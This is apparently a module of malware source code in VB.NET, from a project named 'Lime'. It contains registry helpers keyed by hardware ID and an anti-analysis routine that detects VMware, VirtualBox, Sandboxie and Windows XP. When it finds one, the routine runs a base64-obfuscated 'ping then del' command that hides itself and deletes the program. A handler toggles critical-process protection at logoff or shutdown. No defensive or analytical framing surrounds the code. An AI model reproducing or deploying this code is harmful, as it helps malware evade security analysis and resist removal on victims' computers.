Namespace Lime

    Module C_Fuctions

        Function SB(ByVal s As String) As Byte() ' string to byte()
            Return Text.Encoding.UTF8.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String ' byte() to string
            Return Text.Encoding.UTF8.GetString(b)
        End Function

        Function DLV(ByVal n As String) ' delete value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).DeleteValue(n)
            Catch ex As Exception
            End Try
        End Function

        Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
            Try
                Return Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).GetValue(n, "")
            Catch ex As Exception
                Return ""
            End Try
        End Function

        Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).SetValue(n, t)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function

        Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array ' split bytes by word
            Dim a As New Collections.Generic.List(Of Byte())
            Dim M As New IO.MemoryStream
            Dim MM As New IO.MemoryStream
            Dim T As String() = Split(BS(b), Word)
            M.Write(b, 0, T(0).Length)
            MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
            a.Add(M.ToArray)
            a.Add(MM.ToArray)
            M.Dispose()
            MM.Dispose()
            Return a.ToArray
        End Function

        Sub Anti()
            Try
                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
                    GoTo del
                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
                    GoTo del
                ElseIf Diagnostics.Process.GetProcessesByName("SbieSvc").Length >= 1 Then
                    GoTo del
                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
                    GoTo del
                End If
                Exit Sub
del:
                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
                End
            Catch ex As Exception
            End Try
        End Sub

        Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                C_CriticalProcesses.CriticalProcesses_Disable()
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                C_CriticalProcesses.CriticalProcesses_Disable()
            End If
        End Sub

        Public Function GZip(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
            On Error Resume Next
            If CM Then
                Dim MS As New IO.MemoryStream
                Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
                Ziped.Write(B, 0, B.Length)
                Ziped.Dispose()
                MS.Position = 0
                Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
                MS.Read(buffer, 0, buffer.Length)
                MS.Dispose()
                Return buffer
            Else
                Dim MS As New IO.MemoryStream(B)
                Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
                Dim buffer As Byte() = New Byte(4 - 1) {}
                MS.Position = (MS.Length - 5)
                MS.Read(buffer, 0, 4)
                Dim count As Integer = BitConverter.ToInt32(buffer, 0)
                MS.Position = 0
                Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
                Ziped.Read(array, 0, count)
                Ziped.Dispose()
                MS.Dispose()
                Return array
            End If
        End Function

    End Module
End Namespace